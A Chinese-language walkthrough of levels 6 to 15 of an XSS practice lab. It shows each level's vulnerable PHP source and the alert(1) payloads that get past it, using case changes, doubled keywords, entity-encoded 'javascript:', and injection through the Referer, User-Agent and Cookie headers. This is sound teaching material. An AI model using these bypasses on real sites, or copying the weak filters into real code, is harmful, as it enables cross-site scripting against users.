<h4 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h4><p>1.还是提交上题的playload，发现：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-0c2c22486aa57466.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>发现href被过滤。</p>
<p>2.因为题目是由简到难的，所以前面的题试过的就不再试了，多半是被过滤的，比如on。那还如何绕过呢，想到了转码。试试，转一个字符就好，可在这里转：<a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">Unicode编码转换</a> 打脸，识别不了（因为标签属性没了），基础不行啊。<br><img src="https://upload-images.jianshu.io/upload_images/9216631-aa5367baad70e3ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>3.那先看看源码吧：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>过滤的确实多了，但是少了大小写过滤，原来是在这等着，想多了。那就大小写绕过吧：<code>&quot;&gt;&lt;a Href=&quot;javascript:alert(&#39;1&#39;)&quot;&gt;try&lt;/a&gt;//</code> 成功。</p>
<hr>
<h4 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h4><p>1.提交<code>&quot;&gt;&lt;a Href=&quot;javascript:alert(&#39;1&#39;)&quot;&gt;try&lt;/a&gt;//</code> ，发现：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-8f48ad7e440bc9b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>这个是直接把href和script去掉了，这种很好绕过，直接双写就好了，构造：<code>&quot;&gt;&lt;a hrhrefef=&quot;javasscriptcript:alert(&#39;1&#39;)&quot;&gt;try&lt;/a&gt;//</code> 成功，解析为：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-9cbe735e4ce6931f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>2.现在看一下源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level7&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str =strtolower( $_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">""</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">""</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">""</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">""</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>没什么好说的，这种过滤用处不大。</p>
<hr>
<h4 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h4><p>1.提交<code>&quot;&gt;&lt;a Href=&quot;javascript:alert(&#39;1&#39;)&quot;&gt;try&lt;/a&gt;//</code> ，发现：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-6cce36732763289e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>观察发现，我们应该在友情链接处想办法（只对双引号进行了转义和其他标签进行了过滤，而且本身就有href标签）</p>
<p>2.现在，我们需要做的就是绕过script的过滤，用我们之前说的编码，这里不用担心识别不了，同样，转一个字符即可。提交为：<code>java&amp;#115;cript:alert(1)</code>。<code>s</code>转为unicode,即<code>&amp;#115;</code> 成功，解析为：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-ecf0ceeb7b772072.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>显示如此，但是在执行时会自动转化并识别。</p>
<p>3.最后，看一下源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<hr>
<h4 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h4><p>1.和level8很像，提交<code>javascript:alert(1)</code>，发现：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-743c241d7e59af70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>链接不合法</p>
<p>2.既然如此，那加上<code>http://</code>或<code>https://</code>试试，构造为：<code>javascript:alert(1)/*http://www*/</code><br><img src="https://upload-images.jianshu.io/upload_images/9216631-aba6fefafb96038e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>3.现在只需要绕过script就好了，用上一题的方法，构造：<code>java&amp;#115;cript:alert(1)/*http://www*/</code> 成功，解析为：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-f7560d5b3f943184.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>注：因为考虑到判断是否为合法链接的条件是检测输入中是否存在<code>http://</code>或<code>https://</code>，或是检测是否为<code>http://</code>或<code>https://</code>开头。后者比较麻烦，所以直接试前者。加上注释是为了不影响执行，也可用<code>//http://www*</code> </p>
<p>4.查看一下源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;欢迎来到level9&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>和level8基本没差，就多了是否存在<code>http://</code>。</p>
<p>5.那如果是判断是否为<code>http://</code>或<code>https://</code>开头应该如何绕过呢？<br>目前没想到，望诸位不吝赐教。</p>
<hr>
<h4 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h4><p>1.提交：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 发现：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-1dd416521f5d5eed.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>2.有三个参数，都试试：<code>keyword=&lt;script&gt;alert(1)&lt;/script&gt;&amp;t_link=&lt;script&gt;alert(1)&lt;/script&gt;&quot;type=&quot;txt&quot;&amp;t_history=&lt;script&gt;alert(1)&lt;/script&gt;&quot;type=&quot;txt&quot;&amp;t_sort=&lt;script&gt;alert(1)&lt;/script&gt;&quot;type=&quot;txt&quot;</code> 因为三个参数的类型都为隐藏，所以把他们都设为<code>txt</code>后才能显示出来（会忽略后面的type=”hidden”）。如图：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-c524fe709551c77c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>3.解析为：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-171cf3d033c7c5e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>也就是说只有t_sort的输入处可以利用，因为过滤了<code>&lt;</code>和<code>&gt;</code>，构造：<code>&quot;onclick=&quot;window.alert(1)&quot;type=&quot;txt&quot;</code> 成功，解析为：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-18d549eab33ac2d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>4.最后看一下源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>5.发现，其实只需要输入两个参数，<code>keyword</code>和<code>t_sort</code>。</p>
<hr>
<h4 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h4><p>1.提交<code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 发现：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-855e56d2b724bd7f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>2.有4个参数，都试试吧，看是哪个：<code>keyword=&lt;script&gt;alert(1)&lt;/script&gt;&amp;t_link=&lt;script&gt;alert(1)&lt;/script&gt;&quot;type=&quot;txt&quot;&amp;t_history=&lt;script&gt;alert(1)&lt;/script&gt;&quot;type=&quot;txt&quot;&amp;t_sort=&lt;script&gt;alert(1)&lt;/script&gt;&quot;type=&quot;txt&quot;&amp;t_ref=&lt;script&gt;alert(1)&lt;/script&gt;&quot;type=&quot;txt&quot;</code><br><img src="https://upload-images.jianshu.io/upload_images/9216631-b8642fd0c5aff1b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>还是t_sort处，并且过滤了<code>&lt;</code>，<code>&gt;</code>和<code>&quot;</code> </p>
<p>3.没有头绪，先看源码吧：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ref"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>4.原来还有<code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>，<code>t_sort</code>这里绕不过啊，转义了双引号，又不是单引号闭合。说明这题主要指向<code>$_SERVER[&#39;HTTP_REFERER&#39;]</code></p>
<p>5.在php中，可以使用<code>$_SERVER[‘HTTP_REFERER’]</code>来获取<code>HTTP_REFERER</code>信息。关于<code>HTTP_REFERER</code>，php文档描述如下：</p>
<blockquote>
<p>引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改<br>HTTP_REFERER 的功能。简言之，该值并不可信。 </p>
</blockquote>
<p>6.综上，此题我们需要在<code>HTTP_REFERER</code>上动手。由于规律和上一题一样，直接使用<code>&quot;onclick=&quot;window.alert(1)&quot;type=&quot;text</code>存入Referer中，如图：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-a3f040b860570054.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>7.成功，此题告诉我们要学会在http各种首部字段做文章，看一下解析：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-ac8238c71084f0e3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<hr>
<h4 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h4><p>1.进入后，直接先查看解析：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-2788f9dab2b37f59.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>2.看来这次是利用用户代理，即<code>$_SERVER[&#39;HTTP_USER_AGENT&#39;]</code> 我们需要在<code>user agent</code>上输入。</p>
<p>3.直接将上题的payload输入执行，因为这主要是考各种首部字段，即<br><img src="https://upload-images.jianshu.io/upload_images/9216631-3996cc65b58901a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>4.成功，看一下解析：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-127d45e9739197bc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>5.最后，看一下源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ua"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>6.过滤都一样的，只是利用的首部字段不同了。</p>
<hr>
<h4 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h4><p>1.直接先看解析，这次应该是Cookie，而且对应的内容为<code>call me maybe?</code>不知道对应那个参数。<br><img src="https://upload-images.jianshu.io/upload_images/9216631-a0a6b12693e12f2e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>2.可以试一下，把所有 参数都进行传值，<code>keyword=aaa1&quot;type=&quot;text&amp;t_link=aaa2&quot;type=&quot;text&amp;t_history=aaa3&quot;type=&quot;text&amp;t_sort=aaa4&quot;type=&quot;text&amp;t_cook=aaa5&quot;type=&quot;text</code>如图：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-a5e04a0cf5cb4163.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>没有用，看来获取cookies的参数不是由以上任何参数获取。</p>
<p>3.没办法，用神奇burpsuite抓包看看到底是何参数吧：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-9cf3d30a272e95d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>可以发现，是<code>user</code> 那我们直接在burpsuite中修改cookie吧：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-1f0c05ba90f2d851.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>成功。<br>4.当然，也可以在火狐插件<code>HackBar</code>（上面用的就是此插件）的cookies处提交：<code>user=&quot;onclick=&quot;window.alert(1)&quot;type=&quot;text</code> 现在查看一下解析：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-295e623ecb39242c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>5.最后看看源码吧：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"call me maybe?"</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">"user"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_cook"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>可以看到，是通过<code>user</code>接收cookie，过滤和上面几题还是一样的。</p>
<hr>
<h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h4><p>1.这个题大致看了一下，发现是要我们去访问网站<code>http://www.exifviewer.org/</code> 可是已经打不开了。刚开始并不知是想干嘛，后来才发现是利用关于图片的exif属性。</p>
<p>2.关于exif，百度一下：</p>
<blockquote>
<p><strong>可交换图像文件格式</strong>（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。</p>
</blockquote>
<p>3.这下明确了，应该是想让我们修改图片的exif信息，上传到相应网站，然后达到执行XSS的效果。</p>
<p>4.大概找了一下，没有找到相应的平台，但发现了一个很棒的查看exif信息的网站:<a href="https://exif.tuchong.com/" target="_blank" rel="noopener">图虫EXIF查看器alpha版</a> 可看到的信息非常详细。</p>
<p>5.最后，根据题目的考点，找了几个关于修改图片exif信息的工具，喜欢的可以自己下载玩一玩。</p>
<ul>
<li>PowerExif</li>
<li>MagicEXIF元数据编辑器</li>
</ul>
<hr>
<h4 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h4><p>1.先查看一下响应<br><img src="https://upload-images.jianshu.io/upload_images/9216631-0c8683ee5bbe69dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>2.发现有个”ng-include”，这是什么，先查一下：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-4f7e8df54b7ef41d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
